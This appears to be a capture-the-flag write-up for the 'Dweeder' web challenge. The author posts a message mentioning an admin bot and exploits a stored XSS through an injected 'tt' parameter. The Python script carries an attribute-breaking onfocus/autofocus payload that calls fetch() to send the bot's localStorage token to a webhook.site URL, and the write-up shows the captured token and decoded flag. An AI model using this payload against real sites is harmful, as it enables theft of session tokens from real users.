# Description

This a website where you can post messages to be pushed to a feed. In order to post you need to be logon. It just requires to provide a name and handle.

A special message says :

```
Welcome to Dweeder!

As the developer of the platform, I wish you will have a blast using this application. To mention people, just add "@USER_HANDLE" to your contents (only one mention per dweed!). I'll be monitoring the site 24/7, so tag me and i'll open your message.

@shuky at 08:21
```

# Solution

The goal is to steal the admin token stored in the localstorage.

`XSS` has to be used. The bot monitoring the mentions to @shuky will trigger the `XSS`.

We use the `writeDweed` api function to create a message containing our `XSS` :

```python
import requests

# API url for posting
url = "https://dweeder.ctf.kaf.sh/apis/dweeder/?writeDweed"

params = {
    # My token found in the local storage
    "token" : "eyJleHBpcnkiOm51bGwsImNvbnRlbnQiOnsibmFtZSI6ImdkZnNocWgiLCJoYW5kbGUiOiJxaGRoZHFzaCJ9fQ==:LgQdZ0tqml1KWeJ0tkVk2W6UYB5eL8QUoo/CV6ELcwM=",
    "title" : "mytitle",
    # mention to @shuky mandatory
    "contents" : "@shuky",
    # id is parsed :
    "id":"${tt}",
    # Important element :
    # the first double quote to close the "onClick" event
    # "onfocus" event containing a webhook with localStorage.token
    # "autofocus" make the div autofocus to trigger the fetch
    # "contenteditable" make the focus possible
    "tt":"\"onfocus=\"fetch('https:\/\/webhook.site\/90cadc22-8d7a-4fd6-9de2-fe6875ca3916\/'+localStorage.token)\"autofocus=\"true\"contenteditable=\"true\"" 
}

r=requests.get(url, params = params)

print (r.text)
```

The message is read by the bot and at `webhook.site` we can see the url :

```
https://webhook.site/90cadc22-8d7a-4fd6-9de2-fe6875ca3916/
eyJleHBpcnkiOm51bGwsImNvbnRlbnQiOnsibmFtZSI6IktBRntfdzNsbF90aDR0NV93aDR0X2I0ZF9jMGQzX2wwMGs1X2wxa2V9IiwiaGFuZGxlIjoic2h1a3kifX0=:V0HhP4AicOqHQdqnUT/cDgAV/WbanoUdwaUBw2RsdUg=
```

The token can be decoded with base 64 decoder, the `flag` is stored in the name :

```
{"expiry":null,"content":{"name":"KAF{_w3ll_th4t5_wh4t_b4d_c0d3_l00k5_l1ke}","handle":"shuky"}}xO:vOYGpi@pR
```

# Conclusion

During the event, i was not able to get a valid `XSS`. So i looked at the discord for a solution and found the `tt` variable in the payload.
